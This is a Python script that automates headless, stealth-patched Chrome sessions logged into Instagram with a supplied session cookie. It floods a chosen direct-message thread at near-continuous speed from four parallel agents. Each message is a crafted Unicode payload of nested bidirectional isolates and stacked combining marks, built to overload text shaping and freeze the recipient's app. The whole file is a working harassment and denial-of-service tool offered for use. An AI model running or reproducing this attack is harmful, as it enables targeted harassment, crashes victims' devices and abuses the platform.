# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SHAPING-NUCLEAR V79)
# 📅 STATUS: HARFBUZZ-BUFFER-OVERFLOW | 4-AGENT TOTAL | AWS-CPU-KILL

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- ⚡ VELOCITY & NUCLEAR CONFIG ---
AGENTS_PER_MACHINE = 4             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.01, 0.05)  # 🔥 ABSOLUTE VELOCITY
REST_AFTER_STRIKES = 400   
REST_DURATION = 1          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_nuclear_shaping_payload():
    """Generates a payload that hits the HarfBuzz 150-mark buffer limit."""
    u_id = random.randint(100, 999)
    
    # \u2066 = LRI | \u2067 = RLI | \u2068 = FSI (The Tri-Directional Nest)
    # \u034F = CGJ (Combining Grapheme Joiner)
    lri, rli, fsi, pdi, cgj = "\u2066", "\u2067", "\u2068", "\u2069", "\u034F"
    
    # 150 Stacking marks to overflow the internal shaping buffer
    marks = "".join([chr(i) for i in range(0x0300, 0x036F)] * 2)[:150] 
    glue = "\u2060" # Word Joiner
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NUCLEAR_SHAPE:{u_id}]"
    
    body = []
    # 450 lines - Hitting the absolute 10KB Instagram socket limit
    for i in range(450):
        # We alternate direction for EVERY character within a deep nest.
        # This prevents 'Fast-Path' rendering and forces a C++ context switch.
        line = f"{lri}{rli}{fsi}"
        for char in "PRAVEER":
            line += f"{char}{marks}{cgj}"
        line += f"{pdi*3} 👑 {i}{glue*2}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Direct DOM injection bypassing the 'Typing' hang priority queue."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_nuclear_shaping_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Nuclear-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 100 == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
